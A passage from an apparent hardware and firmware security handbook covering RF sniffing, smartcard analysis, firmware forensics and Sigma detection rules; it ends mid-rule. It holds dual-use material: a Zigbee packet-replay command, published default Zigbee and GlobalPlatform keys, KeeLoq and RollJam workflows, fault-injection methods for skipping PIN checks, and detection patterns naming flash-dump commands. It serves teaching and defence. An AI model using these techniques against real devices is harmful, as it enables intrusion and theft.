        self.source.set_center_freq(433.92e6)   # 433.92 MHz (common ISM band)
        self.source.set_gain(40)

        # Low-pass filter to isolate the signal of interest
        self.lpf = filter.fir_filter_ccf(
            10,  # Decimation factor
            filter.firdes.low_pass(1, 2e6, 50e3, 10e3)
        )

        # Quadrature demodulation (FM/FSK demodulation)
        self.quad_demod = analog.quadrature_demod_cf(1.0)

        # Binary slicer — converts analog signal to digital bits
        self.slicer = digital.binary_slicer_fb()

        # File sink — write raw bits to file for protocol analysis
        self.sink = blocks.file_sink(gr.sizeof_char, "demodulated_bits.bin")

        # Connect the flowgraph
        self.connect(self.source, self.lpf, self.quad_demod,
                     self.slicer, self.sink)

if __name__ == '__main__':
    tb = fsk_demod()
    tb.start()
    input("Press Enter to stop...")
    tb.stop()
    tb.wait()
```

**gr-nordic for nRF24L01 sniffing**: The nRF24L01 (and its successor nRF24L01+) is one of the most widely used 2.4 GHz radio transceivers in wireless peripherals (keyboards, mice, game controllers, drones). The `gr-nordic` project enables sniffing nRF24L01 traffic using an SDR receiver:

```bash
# Install gr-nordic (requires GNU Radio 3.8+)
git clone https://github.com/BastilleResearch/gr-nordic.git
cd gr-nordic && mkdir build && cd build
cmake .. && make && sudo make install

# Sniff nRF24L01 traffic on all channels
# Requires a HackRF or USRP (RTL-SDR is receive-only, which is sufficient for sniffing)
nordic_auto_ack --channel 0-125
```

This is the technology behind the "MouseJack" attack (Bastille Networks, 2016), which demonstrated that many wireless mice and keyboards using nRF24L01 radios transmitted keystrokes unencrypted or with easily broken encryption, allowing an attacker within radio range to inject keystrokes into a victim's computer.

**Zigbee analysis with KillerBee**: For Zigbee protocol RE (used in smart home devices, industrial sensors, and smart meters), the KillerBee framework provides capture and injection capabilities:

```bash
# Install KillerBee (requires a compatible Zigbee radio — TI CC2531 USB dongle
# or Atmel RZUSBstick with KillerBee firmware)
pip install killerbee

# Scan for active Zigbee networks on all channels (11-26)
zbstumbler

# Capture Zigbee traffic on a specific channel
zbdump -c 15 -w capture.pcapng

# Replay captured packets (injection attack)
zbreplay -c 15 -r capture.pcapng

# For decrypting Zigbee traffic, the network key is needed.
# Default Zigbee HA (Home Automation) trust-center link key is well-known:
# 5A:69:67:42:65:65:41:6C:6C:69:61:6E:63:65:30:39 ("ZigBeeAlliance09")
# Wireshark can decrypt Zigbee traffic with this key under
# Edit > Preferences > Protocols > ZigBee > Pre-configured Keys
```

**LoRa/LoRaWAN interception**: LoRa (Long Range) is a spread-spectrum modulation used by IoT devices for low-bandwidth, long-range communication. LoRaWAN (the network protocol on top of LoRa) uses AES-128 encryption with two session keys (NwkSKey for network-layer integrity, AppSKey for application-layer encryption). However, many LoRaWAN deployments use ABP (Activation By Personalization) with static keys rather than OTAA (Over-The-Air Activation) with key exchange, making key extraction from the device firmware sufficient for decrypting all traffic. SDR-based LoRa reception is possible using `gr-lora` (a GNU Radio module) with a HackRF or USRP receiver.

### 6.4 KeeLoq rolling-code attack

KeeLoq is a proprietary block cipher (developed by Microchip) widely used in automotive remote keyless entry (RKE) systems, garage door openers, and access control systems. It uses a 64-bit key and encrypts 32-bit blocks. The rolling-code mechanism works by transmitting a counter value encrypted with the device's key — each button press increments the counter, so replaying a captured transmission is ineffective (the receiver only accepts counter values higher than the last accepted one).

The cryptanalytic attacks against KeeLoq (published by Indesteege et al. at CRYPTO 2008 and by Eisenbarth et al.) demonstrated several practical breaks: (1) a slide-and-determine attack that recovers the manufacturer's key using 2^16 known plaintexts and 2^44.5 KeeLoq encryptions — feasible with precomputation, (2) a side-channel attack (DPA — Differential Power Analysis) against the receiver device that extracts the device key by measuring power consumption during decryption, and (3) a combination attack where the manufacturer key is extracted from one device (via DPA) and then used to compute the device key for any other device using that manufacturer's key — enabling cloning of any remote that shares the manufacturer key.

The practical attack workflow: capture two consecutive rolling-code transmissions from the target remote (using an SDR receiver or a dedicated 433 MHz receiver), extract the encrypted counter values, and use the recovered manufacturer key to derive the device key, after which arbitrary valid rolling codes can be generated. Mitigations include using AES-128 instead of KeeLoq (adopted in newer systems), implementing per-device unique keys derived from a secure KDF, and adding a timestamp or time-window restriction to the rolling-code acceptance window.

A simpler but effective attack that does not require breaking the cipher is the "RollJam" attack (demonstrated by Samy Kamkar at DEF CON 23). The attack uses two radios: one jams the receiver on the target frequency while the other captures the transmitted rolling code. The car owner's first press is captured and jammed (the car does not respond). The owner presses again — the second press is captured while the first (now-valid) code is replayed to unlock the car. The attacker now holds a valid unredeemed rolling code. This attack works against any rolling-code system regardless of the cipher strength, because it exploits the protocol's synchronization mechanism rather than the cryptography. The defense is to implement a time-window constraint: if a code is presented more than a few seconds after it was generated (detectable via a monotonic counter gap), the receiver should reject it and require re-authentication.

### 6.5 Secure element and smartcard RE

Smartcards (ISO 7816) and secure elements (embedded in SIM cards, payment cards, hardware tokens) run JavaCard or native applets on a tamper-resistant chip. RE techniques: side-channel analysis (power analysis, EM emanation — covered in Domain 7, Chapter 7B §3.1), fault injection (voltage glitching, clock glitching, laser fault injection to skip security checks), and protocol analysis (capturing APDU commands/responses via a card reader and analyzing the applet's behavior).

**GlobalPlatform commands**: GlobalPlatform is the standard for managing applications on secure elements. The Issuer Security Domain (ISD) is the master applet that controls application lifecycle (install, delete, lock). Communicating with the ISD requires mutual authentication using the card's master keys (typically 3DES or AES). The `globalplatformtool` (`gp.jar`) is the standard open-source tool:

```bash
# List installed applets on a JavaCard secure element
java -jar gp.jar --list

# With explicit key specification (default GP keys are 404142434445464748494A4B4C4D4E4F)
java -jar gp.jar --list --key 404142434445464748494A4B4C4D4E4F

# Install a JavaCard applet (CAP file) onto the card
java -jar gp.jar --install applet.cap

# Delete an applet by AID (Application Identifier)
java -jar gp.jar --delete A000000001

# Lock the card (irreversible on some cards — use with caution)
java -jar gp.jar --lock

# Send raw APDU commands for manual interaction
java -jar gp.jar --apdu 00A40400 07A0000000041010
# This selects the application with AID A0000000041010
```

**JavaCard applet RE methodology**: JavaCard applets are compiled to a platform-independent bytecode (CAP file format), analogous to Java class files. When a CAP file is available (extracted from a firmware update, leaked from a development environment, or obtained through a GlobalPlatform command), it can be decompiled using tools like `JCAlgTest` (for analyzing cryptographic capabilities) or generic Java decompilers on the converted class files. The `cap2jar` tool converts CAP files to JAR files for analysis.

When the CAP file is not available, RE relies on black-box testing via APDU commands. The approach is to: (1) identify the installed applet AIDs (via GlobalPlatform commands or by brute-forcing SELECT commands), (2) map the applet's command interface by sending probes with different CLA/INS byte combinations and analyzing the response status words (SW1/SW2 — `0x6D00` means "instruction not supported," `0x6E00` means "class not supported," `0x9000` means "success"), (3) for each supported instruction, vary the parameters (P1, P2, data field) to map the full input space, and (4) analyze the response data and status words to infer the applet's internal logic.

Side-channel attacks against secure elements are the most powerful RE technique when physical access is available. Simple Power Analysis (SPA) reveals the instruction sequence being executed (different instructions have different power signatures), allowing an analyst to distinguish between conditional branches (e.g., the "PIN correct" path vs. the "PIN incorrect" path in a PIN verification applet). Differential Power Analysis (DPA) extracts cryptographic key bytes by correlating power consumption measurements with hypothetical intermediate values of the cryptographic computation across many executions.

Fault injection is the complementary physical attack. Voltage glitching (momentarily dropping VCC below the chip's operating threshold during a specific clock cycle) can cause the CPU to skip an instruction — if that instruction is the conditional branch in a PIN verification check, the check is bypassed regardless of the input. Clock glitching (injecting an extra clock edge or shortening a clock cycle) achieves a similar effect by violating the chip's setup/hold timing. Laser Fault Injection (LFI) is the most precise variant: a focused laser beam (typically infrared, 1064 nm) directed at a specific transistor on the decapsulated die can flip individual bits in registers or SRAM. LFI requires decapping the chip (removing the packaging with acid etching or mechanical grinding to expose the silicon die), identifying the target area under an optical or electron microscope, and then positioning the laser with sub-micron precision.

The defense against fault injection in modern secure elements includes: active voltage and clock frequency monitors (which trigger a chip reset or data zeroization if an anomaly is detected), instruction-flow integrity checks (redundant execution of critical code paths, where both paths must agree for the result to be accepted), light sensors on the die surface (which detect decapping or laser illumination), and metal shield layers over sensitive logic (which block optical fault injection without decapping the shield layer first, adding another destructive step that risks destroying the target circuitry).

---

## 7. Firmware Forensics and Incident Response

### 7.1 Forensic acquisition methodology for embedded devices

Firmware forensics diverges sharply from conventional disk forensics because the storage medium (SPI NOR, NAND, eMMC) is soldered to the PCB, the filesystem formats are non-standard (squashfs, UBIFS, JFFS2, YAFFS2, LittleFS), and the evidence is often volatile in ways that traditional forensic examiners do not anticipate. A firmware dump contains the bootloader, kernel, root filesystem, configuration partitions, and frequently a dedicated log or data partition — all concatenated at fixed offsets determined by the flash layout table.

Chain of custody for firmware evidence begins at the physical interface. Before connecting any extraction hardware, the examiner photographs the device PCB (both sides, macro lens, with a scale reference), records all visible component markings, and documents the serial number, MAC address, and any version labels on the housing. If the device is powered, a live acquisition via the OS (through UART shell or SSH) is performed first, since it captures runtime state (mounted filesystems, running processes, network connections, contents of `/proc` and `/sys`) that a cold extraction cannot recover. The live acquisition uses `dd` against the MTD devices:

```bash
# Live acquisition from a running embedded Linux device
# Enumerate flash partitions
cat /proc/mtd
# Typical output:
# dev:    size   erasesize  name
# mtd0: 00040000 00010000 "bootloader"
# mtd1: 00010000 00010000 "env"
# mtd2: 00400000 00010000 "kernel"
# mtd3: 01000000 00010000 "rootfs"
# mtd4: 00100000 00010000 "data"
# mtd5: 00080000 00010000 "log"

# Dump each partition with verification hashes
for i in 0 1 2 3 4 5; do
  dd if=/dev/mtd${i}ro of=/tmp/mtd${i}_dump.bin bs=4096
  sha256sum /tmp/mtd${i}_dump.bin >> /tmp/acquisition_hashes.txt
done

# Capture the full flash as a single image
dd if=/dev/mtd0ro of=/tmp/full_flash.bin bs=4096
cat /proc/mtd >> /tmp/partition_layout.txt

# Record device uptime, current time, and running processes
uptime > /tmp/runtime_state.txt
date -u +"%Y-%m-%dT%H:%M:%SZ" >> /tmp/runtime_state.txt
ps auxww >> /tmp/runtime_state.txt
netstat -tlnp >> /tmp/runtime_state.txt 2>/dev/null || ss -tlnp >> /tmp/runtime_state.txt
```

After live acquisition, power down the device and perform a cold extraction via SPI clip, JTAG, or chip-off (§2.1–2.7). The cold dump is the authoritative evidence copy because it bypasses any OS-level filtering or rootkit interference. Read the flash twice using the same interface and verify that both dumps produce identical SHA-256 hashes. If the hashes differ, the read is unreliable — reduce the SPI clock speed, improve clip contact, or attempt chip-off. Store the verified dump on a write-once medium (Blu-ray, hardware write-blocked USB drive) alongside the hash manifest.

### 7.2 Evidence preservation and integrity

Firmware evidence preservation requires cryptographic hashing at every stage because binary firmware images lack the internal metadata (MFT entries, journal timestamps) that conventional filesystem forensics relies on for integrity verification. The hash chain begins at acquisition and extends through every analytical operation.

Write-blocking for SPI flash reads is a procedural control rather than a hardware feature. Unlike SATA or USB write-blockers, no commercial write-blocker exists for SPI bus reads. Instead, the examiner ensures write protection by software means: use `flashrom -r` (read-only mode — flashrom never writes unless `-w` or `-E` is explicitly specified), verify the flash chip's WP# pin is asserted (grounded), and confirm the Block Protect bits in the SPI status register are set before acquisition. For eMMC, the equivalent is sending the `CMD29` (SET_WRITE_PROT) command via the eMMC reader before performing the read, or using the temporary write-protect flag in the CSD register.

```bash
# Verify SPI flash write protection status before acquisition
# Read the status register (command 0x05) to check BP bits
flashrom -p linux_spi:dev=/dev/spidev0.0,spispeed=1000 --wp-status

# Hash the acquired image immediately upon extraction
sha256sum firmware_dump.bin > firmware_dump.bin.sha256
sha512sum firmware_dump.bin >> firmware_dump.bin.sha512

# Generate a signed timestamp for the evidence
date -u +"%Y-%m-%dT%H:%M:%SZ" > acquisition_timestamp.txt
cat firmware_dump.bin.sha256 >> acquisition_timestamp.txt
# Sign with the examiner's GPG key for non-repudiation
gpg --armor --detach-sign acquisition_timestamp.txt
```

For eMMC forensic preservation, the RPMB (Replay Protected Memory Block) partition deserves special attention. The RPMB is a hardware-authenticated region of the eMMC that can only be written with a valid HMAC key — it is used for storing secure counters (anti-rollback), DRM state, and sensitive configuration. Reading the RPMB requires the authentication key (which is typically provisioned by the manufacturer and not available to the examiner), so its contents may be inaccessible without the key. However, documenting the RPMB's size and access status is part of a thorough acquisition report.

### 7.3 Timeline reconstruction from firmware artifacts

Firmware images embed temporal artifacts that enable reconstruction of the device's history: when the firmware was built, when it was flashed, when configuration files were last modified, and when the device last operated normally. These timestamps establish whether the firmware predates or postdates a compromise, whether the device received legitimate updates, and whether configuration changes correlate with suspicious activity.

Build timestamps are embedded in multiple locations. The Linux kernel image contains a build string (extractable with `strings vmlinux | grep "Linux version"`) that includes the compilation date. U-Boot embeds a build date in its banner string. Squashfs superblocks contain a creation timestamp (viewable with `unsquashfs -s`). Individual files within the root filesystem carry `mtime` values that reflect the build system's clock at packaging time — these are often uniform across all files (indicating a clean build) or mixed (indicating manual post-build modifications, which is suspicious).

```bash
# Extract build timestamps from a firmware image
# Kernel build date
strings firmware_rootfs/boot/vmlinux 2>/dev/null | grep "Linux version"
# Example output: Linux version 4.14.90 (builder@buildhost) (gcc 7.3.0) #1 SMP Mon Jan 7 14:22:31 UTC 2019

# U-Boot build date from the bootloader partition
strings bootloader_dump.bin | grep -i "U-Boot 20"
# Example output: U-Boot 2019.04-rc4 (Apr 12 2019 - 09:33:14 +0000)

# Squashfs creation time
unsquashfs -s rootfs.squashfs 2>/dev/null | grep "Creation"
# Example output: Creation or last append time Fri Jan 11 08:15:22 2019

# File modification times within the extracted filesystem
find squashfs-root/ -type f -printf '%T+ %p\n' | sort | head -20
find squashfs-root/ -type f -printf '%T+ %p\n' | sort | tail -20

# Identify files modified after the bulk build timestamp (anomalous)
BUILD_DATE="2019-01-11"
find squashfs-root/ -type f -newer <(touch -d "$BUILD_DATE" /tmp/ref) -printf '%T+ %p\n'
```

Log partitions on embedded devices typically use a circular buffer (to avoid wearing out the flash with frequent writes) stored either in a dedicated JFFS2/UBIFS partition or as raw sequential writes to a reserved flash region. Recovering these logs requires identifying the log partition from the flash layout, extracting it, and parsing the log format (which may be plaintext syslog, binary journal, or a vendor-proprietary format). Deleted log entries may persist in the flash's unallocated space because flash filesystems do not immediately erase data upon deletion — they mark blocks as stale and defer actual erasure to the garbage collector.

### 7.4 Identifying firmware backdoors

Firmware backdoor detection combines binary comparison against known-good images, entropy analysis for hidden payloads, and behavioral analysis through emulation. The analyst's hypothesis is that the suspect firmware differs from the legitimate version in ways that introduce unauthorized access, exfiltrate data, or modify device behavior.

Binary comparison is the most direct approach when a known-good firmware image is available. The examiner extracts both images, mounts both root filesystems, and performs a recursive diff. Files that differ are candidates for backdoor analysis. Files present in the suspect image but absent from the known-good image are high-priority targets.

```bash
# Binary-level comparison of two firmware images
# Extract both
binwalk -e firmware_suspect.bin
binwalk -e firmware_known_good.bin

# Compare the extracted root filesystems
diff -rq squashfs-root-suspect/ squashfs-root-known-good/ > filesystem_diff.txt

# For files that differ, examine the exact changes
for f in $(diff -rq squashfs-root-suspect/ squashfs-root-known-good/ \
           | grep "^Files" | awk '{print $2}'); do
  echo "=== $f ==="
  if file "$f" | grep -q "ELF"; then
    # Binary diff — show changed functions
    radiff2 "$f" "${f/suspect/known_good}" 2>/dev/null
  else
    # Text diff for config files, scripts
    diff -u "${f/suspect/known_good}" "$f"
  fi
done >> detailed_changes.txt

# Check for new SUID/SGID binaries (privilege escalation backdoors)
find squashfs-root-suspect/ -perm -4000 -type f > suspect_suid.txt
find squashfs-root-known-good/ -perm -4000 -type f > known_good_suid.txt
diff suspect_suid.txt known_good_suid.txt

# Identify ELF binaries that are stripped, packed, or anomalous
find squashfs-root-suspect/ -type f -exec file {} \; | grep "ELF" | \
  grep -v "not stripped" | grep "stripped" > stripped_binaries.txt
```

Entropy analysis identifies hidden or encrypted partitions that do not appear in the standard flash layout. A full-image entropy scan (with `binwalk -E`) at block-level granularity reveals regions of high entropy (encrypted or compressed data) in areas that should be empty (0xFF fill in unused flash regions) or low-entropy (plaintext configuration). A block of high-entropy data in the gap between the rootfs and the next named partition is a strong indicator of a hidden payload.

Hidden partition detection extends beyond entropy. The flash layout defined in the device tree or bootloader environment may not account for all flash regions. Comparing the sum of all partition sizes against the total flash capacity reveals unallocated gaps. These gaps may contain hidden firmware components, exfiltration buffers, or secondary bootloaders that are not referenced by the standard boot chain.

### 7.5 NAND bad block analysis and wear-leveling forensics

Raw NAND flash introduces forensic complexities absent from NOR flash and eMMC. NAND operates in pages (typically 2048 or 4096 bytes) grouped into erase blocks (typically 64 or 128 pages). Each page has an OOB (Out-of-Band) area (typically 64 bytes per 2048-byte page) that stores ECC data, bad-block markers, and filesystem metadata. The OOB data is forensically significant because it contains the ECC bytes that the filesystem driver uses to detect and correct bit errors, and the bad-block table that maps which erase blocks have been retired due to wear.

Wear-leveling distributes write operations across all erase blocks to prevent premature failure of frequently-written blocks. From a forensic perspective, wear-leveling means that overwritten data may persist in the original physical location while the logical address now points to a different physical block. The wear-leveling metadata (maintained by UBIFS, YAFFS2, or the FTL — Flash Translation Layer) maps logical-to-physical block assignments. Parsing this metadata reveals the history of block reassignments, which can expose previously-written data that has been logically overwritten but not physically erased.

```bash
# Analyze NAND OOB structure from a raw dump
# nanddump preserves OOB data; dd does not
# On a live device with MTD access:
nanddump --oob /dev/mtd3 -f mtd3_with_oob.bin

# Parse the bad block table
# The bad block marker is typically the first byte of the OOB area for each
# block's first page. A value other than 0xFF indicates a bad block.
python3 -c "
import sys
data = open('mtd3_with_oob.bin', 'rb').read()
page_size = 2048
oob_size = 64
pages_per_block = 64
block_size = (page_size + oob_size) * pages_per_block
total_blocks = len(data) // block_size
bad_blocks = []
for block in range(total_blocks):
    oob_offset = block * block_size + page_size  # OOB of first page
    marker = data[oob_offset]
    if marker != 0xFF:
        bad_blocks.append(block)
        print(f'Bad block {block} at offset 0x{block * block_size:08X}, marker=0x{marker:02X}')
print(f'Total bad blocks: {len(bad_blocks)} / {total_blocks}')
"

# Use ubi-utils to analyze UBI layer metadata
ubireader_display_info nand_dump.bin
# Shows: UBI version, image sequence number, volume table,
# PEB-to-LEB mapping (Physical-to-Logical Erase Block)
```

The PEB-to-LEB (Physical Erase Block to Logical Erase Block) mapping maintained by UBI is a forensic goldmine. When a logical block is overwritten, UBI allocates a new physical block and updates the mapping. The old physical block is queued for erasure but may not be erased immediately. By scanning all physical blocks (including those not currently mapped to logical blocks), the examiner can recover previous versions of data — configuration files, log entries, or firmware components that were updated.

### 7.6 Case study: analyzing a compromised IoT camera firmware

This walkthrough illustrates the end-to-end forensic workflow for an IP camera that was observed making unexpected outbound connections to a command-and-control server. The device is a generic Hisilicon-based IP camera running embedded Linux on a Hi3516 SoC with 16 MB SPI NOR flash.

Step 1 — Acquisition: The examiner connects a SOIC-8 test clip to the SPI flash chip (identified as a Winbond W25Q128 by its part marking), holds the SoC in reset by grounding the NRST pin, and dumps the flash with flashrom. Two consecutive reads produce matching SHA-256 hashes, confirming a clean acquisition. Total flash size: 16 MB (0x1000000 bytes).

Step 2 — Partition identification: Running `binwalk` on the full dump identifies the flash layout: U-Boot at offset 0x0, U-Boot environment at 0x40000, kernel (uImage) at 0x50000, squashfs rootfs at 0x250000, JFFS2 data partition at 0xD00000, and 0xFF fill from 0xF00000 to end. The examiner notes an unexpected 64 KB block of high-entropy data at offset 0xFC0000 that does not appear in the standard partition layout for this device model.

Step 3 — Filesystem extraction and comparison: The squashfs rootfs is extracted and compared against a known-good firmware image downloaded from the manufacturer's website. The diff reveals three modified files: `/usr/bin/daemon_monitor` (an ELF binary not present in the original firmware), `/etc/init.d/S90monitor` (a startup script that launches `daemon_monitor`), and `/etc/resolv.conf` (modified to include an additional DNS server at an external IP address).

Step 4 — Binary analysis: Loading `daemon_monitor` in Ghidra (ARM little-endian, base address auto-detected from ELF headers) reveals a small binary (12 KB) that opens a raw socket, constructs DNS queries to a hardcoded domain, parses the TXT record responses for base64-encoded commands, executes them via `system()`, and encodes the output into DNS query subdomains for exfiltration. The binary is stripped but not obfuscated — function calls to `socket()`, `sendto()`, `recvfrom()`, and `system()` are clearly visible. The hardcoded C2 domain resolves to infrastructure previously associated with IoT botnet operations.

Step 5 — Hidden partition analysis: The anomalous 64 KB block at 0xFC0000 is extracted and analyzed. Entropy analysis shows it is encrypted or compressed. Searching the `daemon_monitor` binary for references to offset 0xFC0000 reveals a secondary payload loader that reads this block, XOR-decrypts it with a 16-byte key embedded in the binary, and writes the decrypted content to `/tmp/.update` before executing it. The decrypted payload is a Mirai-variant scanner module.

Step 6 — Timeline: The U-Boot build timestamp is 2018-03-15. The legitimate squashfs creation timestamp is 2019-06-22. The `daemon_monitor` binary has an embedded build string dated 2023-11-04. The JFFS2 data partition contains log fragments showing the device was reflashed via its cloud update API on 2023-11-03, correlating with a known supply-chain compromise of the manufacturer's update server.

### 7.7 Firmware-specific incident response runbook

Firmware incidents differ from conventional IT incidents because remediation cannot rely on software-only controls — a compromised bootloader persists across OS reinstallation, a modified firmware image survives factory reset (which typically only erases the data partition, not the rootfs or bootloader), and remote attestation of firmware integrity is often impossible without physical access or a hardware root of trust.

The IR workflow for firmware compromise proceeds through four phases. Phase 1 (Identification): network monitoring detects anomalous traffic from the device (unexpected DNS queries, connections to known-bad IPs, data exfiltration patterns). The SOC correlates the traffic with the device's asset inventory to determine the device type, firmware version, and network segment. Phase 2 (Containment): the device is network-isolated (VLAN reassignment or switch port shutdown — not powered off, because power loss may trigger anti-forensics mechanisms in sophisticated implants). If the device is one of many identical units, a sampling strategy determines how many devices to acquire for forensic examination. Phase 3 (Eradication): firmware reflashing with a verified-good image is the only reliable eradication method. Software-only remediation (killing processes, deleting files) is insufficient because the rootfs is typically read-only squashfs — any malicious modifications are baked into the flash image and will reappear on reboot. The reflash must include the bootloader partition (not just the rootfs) because a compromised bootloader can re-inject the payload during boot. Phase 4 (Recovery and Lessons): the reflashed device is monitored for recurrence, firmware signing is implemented or strengthened to prevent future unauthorized modifications, and the supply chain (firmware update servers, build infrastructure, developer credentials) is audited for compromise.

For fleet-wide incidents affecting hundreds or thousands of identical devices (common in IoT deployments — IP cameras, sensors, industrial gateways), the IR team must determine whether the compromise vector was the firmware supply chain (affecting all devices that received a specific update), a network-based exploit (affecting devices reachable from a specific network segment), or a physical attack (affecting individual devices with physical access). The vector determines the scope: supply-chain compromise requires reflashing all devices that received the tainted update, network exploit requires patching the vulnerability and reflashing compromised devices, and physical attack is typically limited to the targeted device.

---

## 8. Detection Engineering for Firmware Attacks

### 8.1 SIEM integration for firmware events

Embedded devices rarely generate syslog output compatible with enterprise SIEM platforms. The detection engineering challenge is twofold: instrumenting the firmware to emit security-relevant events, and normalizing those events into a format (CEF, Syslog RFC 5424, or JSON) that the SIEM can ingest and correlate. Where firmware instrumentation is not possible (closed-source devices, resource-constrained microcontrollers), network-level detection and host-based monitoring from the device management platform serve as proxies.

Firmware events that warrant SIEM integration include: boot integrity measurement results (passed/failed Secure Boot verification), debug interface access attempts (JTAG/SWD connection events, if the SoC reports them), firmware update operations (initiation, completion, failure, version change), authentication events (console login attempts, failed API authentications), and configuration changes (especially to network settings, DNS servers, NTP servers, and firewall rules). The device's syslog output (if available via UART, network syslog, or a management API) is the primary event source. For devices that do not support syslog, the network management platform (TR-069/CWMP for CPE devices, MQTT for IoT devices, SNMP for network equipment) provides event data.

Mapping firmware events to MITRE ATT&CK for ICS and the MITRE ATT&CK framework's Initial Access, Persistence, and Defense Evasion tactics provides a structured detection model. A firmware modification maps to T1542.001 (Pre-OS Boot: System Firmware), a debug interface access maps to T1200 (Hardware Additions) or T1021 (Remote Services) depending on the access vector, and a firmware rollback attempt maps to T1562.001 (Impair Defenses: Disable or Modify Tools).

### 8.2 Sigma rules for firmware attack detection

The following Sigma rules detect firmware-specific attack patterns. Each rule targets a distinct attack vector and is designed for environments where firmware event data reaches the SIEM via syslog, CEF forwarders, or custom log ingestion pipelines.

Unauthorized firmware flash operations outside scheduled maintenance windows are a primary indicator of compromise. Legitimate firmware updates follow a predictable pattern: they are initiated by the device management platform, occur during defined maintenance windows, and are preceded by a backup operation. An ad-hoc flash write, especially one initiated from the device console or a non-management network segment, is anomalous.

```yaml
title: Unauthorized Firmware Flash Operation Outside Maintenance Window
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
  Detects SPI flash write operations or firmware update commands executed
  outside of the defined maintenance window. Legitimate firmware updates are
  scheduled and initiated by the management platform.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1542/001/
logsource:
  category: firmware
  product: embedded_linux
detection:
  selection_flash_write:
    EventType|contains:
      - 'flashrom'
      - 'fw_setenv'
      - 'mtd_write'
      - 'flash_eraseall'
      - 'nandwrite'
      - 'dd of=/dev/mtd'
  filter_maintenance_window:
    EventTime|timeframe: '02:00-04:00'
  condition: selection_flash_write and not filter_maintenance_window
falsepositives:
  - Emergency firmware updates outside normal schedule
  - Development/testing environments
level: high
tags:
  - attack.persistence
  - attack.t1542.001
```

JTAG and SWD debug port access on production devices is never expected in normal operation. Modern SoCs can generate an interrupt or log event when the debug interface is activated (ARM CoreSight debug authentication events), which can be forwarded to the SIEM. The detection relies on the SoC's debug authentication module reporting access attempts.

```yaml
title: JTAG/SWD Debug Port Access on Production Device
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: experimental
description: >
  Detects debug interface activation events on production devices where
  JTAG/SWD access is not expected. ARM CoreSight debug authentication
  events or SoC security monitor alerts trigger this rule.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1200/
logsource:
  category: firmware
  product: arm_soc
detection:
  selection:
    EventType|contains:
      - 'debug_auth'
      - 'JTAG_CONNECT'
      - 'SWD_ACCESS'
      - 'DAP_HANDSHAKE'
      - 'coresight_debug_enable'
  filter_known_debug_sessions:
    SourceIP|cidr:
      - '10.0.100.0/24'
    User: 'hw_debug_service'
  condition: selection and not filter_known_debug_sessions
falsepositives:
  - Authorized hardware debugging by the engineering team
level: critical
tags:
  - attack.initial_access
  - attack.t1200
```

Secure Boot integrity violations indicate that the boot chain has been tampered with or that a signed component has been revoked. UEFI systems log Secure Boot violations in the TPM event log and the Windows event log. Embedded Linux systems with verified boot (dm-verity, U-Boot FIT image verification) generate boot failure messages on the serial console.

```yaml
title: Bootloader Integrity Violation - Secure Boot Failure
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: >
  Detects Secure Boot verification failures indicating bootloader or
  kernel image tampering. Covers UEFI Secure Boot, U-Boot verified boot,
  and ARM Trusted Firmware BL verification failures.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1542/001/
logsource:
  category: firmware
  product: bootloader
detection:
  selection:
    Message|contains:
      - 'Secure Boot violation'
      - 'Image verification failed'
      - 'RSA signature check failed'
      - 'FIT image verification error'
      - 'BL2: Failed to load BL31'
      - 'Authentication failure'
      - 'dm-verity corruption'
      - 'verity_verify_level0: data block'
  condition: selection
falsepositives:
  - Corrupted firmware due to power loss during update
  - Intentional firmware modification in development environment
level: critical
tags:
  - attack.defense_evasion
  - attack.t1542.001
```

Suspicious UART console access follows distinct patterns that differ from legitimate engineering use. Repeated rapid authentication attempts, access from a newly-connected serial interface during production operation (not during a scheduled maintenance event), and execution of reconnaissance commands (`cat /proc/mtd`, `fw_printenv`, `dd if=/dev/mtd`) immediately after console access are indicators of unauthorized physical access.

```yaml
title: Suspicious UART Console Access Pattern
id: d4e5f6a7-b8c9-0123-defa-234567890123
status: experimental
description: >
  Detects suspicious serial console activity patterns indicating
  unauthorized physical access: rapid auth attempts, firmware
  reconnaissance commands, or console access outside maintenance.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1200/
logsource:
  category: authentication
  product: embedded_linux
detection:
  selection_console_recon:
    CommandLine|contains:
      - 'cat /proc/mtd'
      - 'fw_printenv'
      - 'dd if=/dev/mtd'
      - 'hexdump /dev/mtd'
      - 'flashrom'
      - 'nanddump'
    TerminalType: 'ttyS0'
  selection_brute_force:
    EventType: 'auth_failure'
    TerminalType|contains:
      - 'ttyS'
      - 'ttyAMA'
      - 'ttyMSM'
    count|gte: 5
    timeframe: '300s'
  condition: selection_console_recon or selection_brute_force
falsepositives:
  - Authorized on-site maintenance
  - Factory provisioning line
level: high
tags:
  - attack.initial_access
  - attack.t1200
```

Firmware rollback attacks exploit the absence of anti-rollback protection to install an older firmware version that contains known vulnerabilities. The detection monitors for firmware version downgrades by comparing the reported version after an update against the previously recorded version.

```yaml
title: Firmware Rollback Attempt - Version Downgrade Detection
id: e5f6a7b8-c9d0-1234-efab-345678901234
status: experimental
description: >
  Detects firmware version downgrades that may indicate a rollback
  attack. The rule compares the post-update firmware version against
  the pre-update version and alerts on any decrease.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1562/001/
logsource:
  category: firmware
  product: device_management
detection:
  selection:
    EventType: 'firmware_update_complete'
  filter_version_increase:
    NewVersion|version_gt: '%OldVersion%'
  condition: selection and not filter_version_increase
falsepositives:
  - Intentional rollback due to regression in newer firmware
  - Version numbering scheme changes
level: high
tags:
  - attack.defense_evasion
  - attack.t1562.001
```

Baseband anomaly detection targets unexpected AT command sequences that indicate unauthorized modem control. Normal modem operation uses a predictable set of AT commands during initialization and call setup. Commands like `AT+QLINUXCMD`, `AT+CSIM` (direct SIM APDU access), or rapid enumeration via `AT+CLAC` outside of provisioning workflows are anomalous.

```yaml
title: Baseband Anomaly - Unexpected AT Command Sequence
id: f6a7b8c9-d0e1-2345-fabc-456789012345
status: experimental
description: >
  Detects unexpected AT command patterns on the modem interface that
  indicate unauthorized baseband access: command enumeration, direct
  SIM access, or vendor debug commands outside provisioning context.
author: Renan Augusto Macena
date: 2025-06-01
references:
  - https://attack.mitre.org/techniques/T1021/
logsource:
  category: modem
  product: baseband
detection:
